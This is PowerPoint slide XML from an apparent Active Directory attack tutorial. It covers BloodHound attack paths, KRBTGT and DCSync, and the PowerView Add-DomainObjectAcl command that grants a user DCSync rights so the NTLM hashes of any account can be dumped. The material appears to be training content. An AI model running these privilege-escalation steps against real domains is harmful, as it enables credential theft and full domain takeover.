            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> GUI </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Import the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>.zip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> collected data </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" b="1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700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Step 3 — Find attack paths</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Search in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Shortest Path to Domain Admins</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>” </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Or query for: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="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700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>GenericWrite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="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700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>AllExtendedRights</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Arial Unicode MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>         .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>WriteDACL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700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700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>          .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>WriteOwner</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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CA1CA70-7B0B-F862-E07C-EA35009AAACE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3404737" y="1339181"/>
            <a:ext cx="7636510" cy="112204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02BDD18-72D4-E841-7375-DAEF6370DB03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4220860" y="3800407"/>
            <a:ext cx="7051040" cy="21951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265462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💥 Example scenario:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>		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🔥 Another scenario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2205473"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="130629" y="415078"/>
          <a:ext cx="5203371" cy="2865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03371">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="39184169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BloodHound shows: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534854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your_user</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t> → GenericWrite → </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>helpdesk_admin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043693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And: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30302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helpdesk_admin</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t> → </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>MemberOf</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t> → Domain Admins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45017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Translation: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35079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👉 You can modify </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>helpdesk_admin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45743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👉 That account is powerful</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>👉 You can escalate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9996041"/>
                  </a:ext>
                </a:extLst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8885764"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="130629" y="3939116"/>
          <a:ext cx="6384471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84471">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="132727555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err="1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your_user</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US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 → </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1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AllExtendedRights</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US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 → Domain Admin user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38220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👉 You might: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800987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Reset their password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689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Take over account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46998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💀 Become Domain Admin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2801949"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame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53583464"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="5464628" y="787400"/>
          <a:ext cx="6562271" cy="73950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62271">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2680681455"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="37374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solidFill>
                            <a:srgbClr val="FF4343"/>
                          </a:solidFill>
                          <a:highlight>
                            <a:srgbClr val="000000"/>
                          </a:highlight>
                        </a:rPr>
                        <a:t>Helpdesk= user account or security group</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF4343"/>
                          </a:solidFill>
                          <a:highlight>
                            <a:srgbClr val="000000"/>
                          </a:highlight>
                        </a:rPr>
                        <a:t> that has </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF4343"/>
                          </a:solidFill>
                          <a:highlight>
                            <a:srgbClr val="000000"/>
                          </a:highlight>
                        </a:rPr>
                        <a:t>elevated</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="FF4343"/>
                        </a:solidFill>
                        <a:highlight>
                          <a:srgbClr val="000000"/>
                        </a:highlight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0863460"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="32413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solidFill>
                            <a:srgbClr val="002060"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>permissions related to IT support / helpdesk operations</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="002060"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>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440477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1777304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-1" y="0"/>
            <a:ext cx="12388645" cy="6858000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1700" dirty="0"/>
              <a:t>PART 2 — Grant Yourself </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> Rights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700" dirty="0"/>
              <a:t>Use Add-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>DomainObjectAcl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>PowerView</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>) to grant yourself "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>" rights. 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1700" dirty="0"/>
              <a:t>1.What is KRBTGT (Kerberos Ticket-Granting Ticket)?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1700" dirty="0"/>
              <a:t>is a default, built-in service account in Microsoft Active Directory that acts as the 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1700" dirty="0"/>
              <a:t>Key Distribution Center (KDC) for Kerberos authentication. It signs and encrypts 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1700" dirty="0"/>
              <a:t>Kerberos tickets (TGTs) and is crucial to security, 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1700" dirty="0"/>
              <a:t>as its compromise allows attackers to create "Golden Tickets". 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1700" dirty="0"/>
              <a:t>The password should be rotated, ideally twice, to prevent unauthorized access.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700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>2. What is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>?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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>👉 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> is not a tool — it’s a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>capability</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>It means: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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>“You can pretend to be a Domain Controller and request password data”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="274763399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4808D4-A8C1-A726-8ADA-379CDF3FF7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1999" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="2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2800" dirty="0"/>
              <a:t>This lets you dump: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800" dirty="0"/>
              <a:t>NTLM hashes of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0"/>
              <a:t>any user</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="28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2800" dirty="0"/>
              <a:t>Including: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800" dirty="0"/>
              <a:t>Domain Admins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800" dirty="0"/>
              <a:t>Service accounts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800" dirty="0"/>
              <a:t>Even </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0"/>
              <a:t>KRBTGT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> (game over)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2800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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>3. What is Add-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>DomainObjectAcl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>?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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>👉 This comes from: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800" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>PowerView</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2800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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>💡 What it does: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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>It modifies permissions (ACLs) on AD objects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800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="95000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>🎯 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="95000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Goal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800" dirty="0"/>
              <a:t>Give your user the ability to replicate AD secrets (like a Domain Controller)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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>👉 You are: Adding replication permissions to YOUR user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188270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6400800" cy="6683829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1900" b="1" dirty="0"/>
              <a:t>⚠️ BEFORE YOU START (critical condition)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900" dirty="0"/>
              <a:t>This step only works if BloodHound showed something like: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900" dirty="0"/>
              <a:t>You → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1"/>
              <a:t>WriteDACL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> → Domain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900" dirty="0"/>
              <a:t>You → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1"/>
              <a:t>GenericAll</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> → Domain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900" dirty="0"/>
              <a:t>You → control over a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>high-value object (domain object)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>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900" dirty="0"/>
              <a:t>👉 If you DON’T have this → this step will fail.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900" b="1" dirty="0"/>
              <a:t>Step 1 — Get into compromised Windows machine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900" dirty="0"/>
              <a:t>You need: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900" dirty="0"/>
              <a:t>A shell (PowerShell / CMD / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>WinRM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>)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900" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Step 2 — Load </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>PowerView</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Use:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>PowerView</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Option A — Import script</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="95000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Import-Module .\PowerView.ps1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="19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187E40D-3F3E-8EEB-D5B3-5272BA0106A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6529848" y="167442"/>
            <a:ext cx="6127954" cy="50383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1800" dirty="0"/>
              <a:t>✔ Verify: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FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Get-Domain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800" dirty="0"/>
              <a:t>If it works → you’re good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800" dirty="0"/>
              <a:t>You’ll get domain info like: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800" dirty="0"/>
              <a:t>Name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800" dirty="0"/>
              <a:t>Forest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800" dirty="0"/>
              <a:t>Domain Controllers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800" dirty="0"/>
              <a:t>SID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800" dirty="0"/>
              <a:t>Example (simplified):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800" dirty="0"/>
              <a:t>Forest                  : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>corp.local</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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800" dirty="0" err="1"/>
              <a:t>DomainControllers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>       : DC01.corp.local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800" dirty="0"/>
              <a:t>Name                    : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>corp.local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82156577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11408229" cy="7886700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1700" dirty="0"/>
              <a:t>Step 3 — Identify the DOMAIN object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700" dirty="0"/>
              <a:t>You are NOT targeting a user here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700" dirty="0"/>
              <a:t>👉 You are targeting the domain itself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700" dirty="0"/>
              <a:t>Get domain name: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700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Get-Domain</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill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1700" dirty="0"/>
              <a:t>Example output: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700" dirty="0" err="1"/>
              <a:t>corp.local</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" dirty="0"/>
              <a:t>Step 4 — Grant </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> Rights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700" dirty="0"/>
              <a:t>Now the key action 👇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700" dirty="0"/>
              <a:t>Command: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FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Add-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DomainObjectAcl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TargetIdentity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t> "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>corp.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>" -PrincipalIdentity "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>your_user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>" -Rights </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DCSync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FFFF00"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="17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F9026B0-4848-6AE7-AC0A-9DBF4A6C5B49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6071420" y="154043"/>
            <a:ext cx="6120580" cy="44471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200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>🔍 Breakdown:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>TargetIdentity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>corp.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>" → domain object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>PrincipalIdentity "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>your_user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>" → YOU</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>-Rights </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> → adds replication rights</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>💥 What this does internally</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>It adds:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>DS-Replication-Get-Changes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>DS-Replication-Get-Changes-All 👉 to your user</a:t>
            </a:r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4EC45F6-4C2A-A444-3188-7597D8B4E395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64262" y="2478406"/>
